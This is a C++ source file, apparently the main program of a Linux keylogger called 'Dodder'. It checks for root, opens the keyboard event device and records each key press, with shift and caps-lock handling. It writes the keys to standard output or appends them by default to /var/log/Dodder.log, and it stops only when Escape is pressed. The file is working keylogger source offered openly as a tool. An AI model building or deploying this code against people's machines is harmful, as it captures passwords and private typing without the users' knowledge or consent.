//C++ based libraries
#include <iostream>
#include <fstream>
#include <string>

//my libraries
#include <keyname.h>
#include <util.h>
#include <lib/getoptpp/include/getopt_pp.h>


//main
int main(int argc, char **argv)
{
    int kbd_Fd;

    input_event eve;
    checkRoot();
    kbd_Fd = openKeyboardFile();

    GetOpt::GetOpt_pp args(argc, argv);

    bool shiftPressed = false, capsActive = false;
    bool isStdOut = false, isFile = false;

    std::string path = "/var/log/Dodder.log";
    std::string keyWord;

    std::fstream fleObj;

    if(args >> GetOpt::OptionPresent('h', "help"))
    {
        printHelpText();
        exit(EXIT_SUCCESS);
    }

    if(args >> GetOpt::OptionPresent('v', "version"))
    {
        printVersionInfo();
        exit(EXIT_SUCCESS);
    }

    if(args >> GetOpt::OptionPresent('s', "stdout"))
        isStdOut = true;

    if(args >> GetOpt::OptionPresent('f', "file"))
    {
        isFile = true;
        args >> GetOpt::Option('f', "file", path, "/var/log/Dodder.log");
    }
    else
        isFile = isStdOut == false ? true : false;

    if(isFile)
        fleObj.open(path, std::ios::app | std::ios::ate);

    if(!fleObj.is_open() && isFile)
        throw std::runtime_error("Error while opening the given log file");

    while(read(kbd_Fd, &eve, sizeof(input_event)) > 0)
    {
        if(eve.type == EV_KEY)
        {
            if(eve.value == KEY_RELEASE && isCaps(eve.code))
                capsActive = !capsActive;
            if(eve.value == KEY_PRESS && isShift(eve.code))
                shiftPressed = true;
            if(eve.value == KEY_RELEASE && isShift(eve.code))
                shiftPressed = false;
            if(eve.value == KEY_PRESS)
                //std::cout << getKey(eve.code, shiftPressed, capsActive) << std::endl;
                keyWord = std::string(getKey(eve.code, shiftPressed, capsActive));
        }
        if(eve.type == EV_KEY && eve.code == 1)
            break;
        if(isStdOut && eve.value == KEY_PRESS && eve.type == EV_KEY)
            std::cout << keyWord << std::endl;
        if(isFile && eve.value == KEY_PRESS && eve.type == EV_KEY)
            fleObj << keyWord;
    }
    close(kbd_Fd);
    fleObj.close();
    return 0;
}
